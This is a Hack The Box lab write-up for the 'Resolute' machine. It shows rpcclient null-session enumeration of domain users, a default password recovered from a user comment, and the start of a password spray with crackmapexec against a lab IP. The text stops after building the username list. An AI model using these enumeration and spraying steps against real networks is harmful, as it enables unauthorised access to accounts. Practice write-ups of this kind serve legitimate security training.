# Hack the Box - Resolute

# Enumeration
## NMAP
```CSS
▶ 
```

## RPC Client
  - Null Session Authentication
```CSS
▶ rpcclient -U "" -N 10.10.10.169
```

  - Enumerate Domain Users
```CSS
rpcclient $> enumdomusers
```
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/d4596127-4b1b-4957-ac1b-c0e30d6cd312)

  - Query Users Info
```CSS
rpcclient $> querydispinfo
```
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/ec7322f6-3ebb-4fb8-8691-c8c92af2dc0e)
The above command return brief information about all the users. An interesting comment for `RID 0x457` is also found.
```CSS
Credentials - marko:Welcome123!
```

  - Query Single User's Info
```CSS
rpcclient $> queryuser 0x1f4
```
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/56612aa0-fa48-41b2-ad95-e6cd47bf97a5)

---

## SMB
  - Attempt to login with found credentials.
```CSS
▶ crackmapexec smb 10.10.10.169 -u marco -p 'Welcome123!' --continue-on-success
```
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/a8ca9538-8a8c-45f6-8263-89df0d2eaeb9)

### Password Spray
  - Create a file containing the list of users found via RPC.
  - Authenticate as any user using the password default password found.
```CSS
▶ vim users.txt

user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5] 
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[ryan] rid:[0x451]   
user:[marko] rid:[0x457]
user:[sunita] rid:[0x19c9]
user:[abigail] rid:[0x19ca]
user:[marcus] rid:[0x19cb]
user:[sally] rid:[0x19cc]
user:[fred] rid:[0x19cd]
user:[angela] rid:[0x19ce]
user:[felicia] rid:[0x19cf]
user:[gustavo] rid:[0x19d0]
user:[ulf] rid:[0x19d1]
user:[stevie] rid:[0x19d2]
user:[claire] rid:[0x19d3]
user:[paulo] rid:[0x19d4]
user:[steve] rid:[0x19d5]
user:[annette] rid:[0x19d6]
user:[annika] rid:[0x19d7]
user:[per] rid:[0x19d8]
user:[claude] rid:[0x19d9]
user:[melanie] rid:[0x2775]
user:[zach] rid:[0x2776]
user:[simon] rid:[0x2777]
user:[naoki] rid:[0x2778]
```

Use within vim to extract the usernames:`%s/user:\[\(.*\)\] rid:\[.*\]/\1/g`
